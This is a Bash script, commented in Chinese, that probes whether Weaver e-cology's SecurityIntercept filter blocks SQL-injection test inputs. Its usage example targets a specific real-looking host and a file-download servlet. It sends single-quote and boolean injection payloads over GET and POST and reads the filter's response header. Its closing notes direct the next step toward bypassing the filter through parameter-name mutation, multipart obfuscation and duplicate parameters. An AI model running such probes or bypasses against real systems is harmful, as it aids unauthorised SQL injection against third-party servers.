#!/usr/bin/env bash
# 泛微 e-cology SecurityIntercept 判定探针（只读，5 请求，间隔 2s）
# 用法: ./weaver_securityintercept_probe.sh <base> <path> <kv-ok> <param>
#   例: ./weaver_securityintercept_probe.sh https://project.flux.com.cn \
#         /weaver/weaver.file.FileDownloadForOutDoc isFromOutImg=1 fileid
set -u
# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./weaver_securityintercept_probe.sh <https://TARGET>\n' >&2; exit 1; fi
BASE="${1:?base url, e.g. https://host}"
PATH_="${2:?servlet path, e.g. /weaver/x.y.Z}"
KV_OK="${3:?合法的 参数=值, e.g. isFromOutImg=1}"
PARAM="${4:?待测参数名, e.g. fileid}"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'

probe() { # $1=label $2=url $3=method $4=data
  local label="$1" url="$2" m="${3:-GET}" d="${4:-}"
  local out code size tt hdr
  hdr=$(mktemp)
  if [ "$m" = POST ]; then
    out=$(curl -sS --max-time 30 -k -X POST "$url" \
            -H 'Content-Type: application/x-www-form-urlencoded' -A "$UA" \
            --data "$d" -D "$hdr" -o /dev/null \
            -w '%{http_code}|%{size_download}|%{time_total}')
  else
    out=$(curl -sS --max-time 30 -k -A "$UA" "$url" -D "$hdr" -o /dev/null \
            -w '%{http_code}|%{size_download}|%{time_total}')
  fi
  code=${out%%|*}; out=${out#*|}; size=${out%%|*}; tt=${out#*|}
  if grep -qi '^errorMsg: *securityIntercept' "$hdr"; then
    printf '%-46s %s | %5s B | %7ss | **SecurityIntercept 拦截**\n' "$label" "$code" "$size" "$tt"
  elif [ "$code" = 404 ] && [ "$size" = 534 ]; then
    printf '%-46s %s | %5s B | %7ss | 真 404（无 errorMsg 头）\n' "$label" "$code" "$size" "$tt"
  else
    printf '%-46s %s | %5s B | %7ss | 业务响应 / 其它\n' "$label" "$code" "$size" "$tt"
  fi
  rm -f "$hdr"; sleep 2
}

echo "== 泛微 SecurityIntercept 判定 =="
echo "-- 组 1：真 404 基线（不存在的路径）"
probe "不存在路径 /zz_probe_$$_nx"    "$BASE/zz_probe_$$_nx" GET
echo "-- 组 2：业务正常返回（合法参数）"
probe "合法参数 $KV_OK&$PARAM=1"      "$BASE$PATH_?$KV_OK&$PARAM=1" GET
echo "-- 组 3：参数级安全拦截（危险字符放在 $PARAM 上）"
probe "$PARAM=1' (单引号, GET)"        "$BASE$PATH_?$KV_OK&$PARAM=1%27" GET
probe "$PARAM=1 && 1=2 (布尔, GET)"    "$BASE$PATH_?$KV_OK&$PARAM=1%20%26%26%201=2" GET
probe "$PARAM=1' (单引号, POST)"       "$BASE$PATH_" POST "$KV_OK&$PARAM=1'"
echo
echo "判读要点："
echo "  · 组 3 若出现 errorMsg: securityIntercept → 拦截发生在 servlet 之前，SQL 从未执行。"
echo "  · 组 3 GET 与 POST 结果一致 → 拦截是参数级、与方法无关：换方法、换 SQL 方言都无意义。"
echo "  · 下一步方向只能是「绕过 SecurityIntercept」（参数名变形 / multipart 混淆 / 同名参数重复 / 分号分隔符），不是换注入技术。"
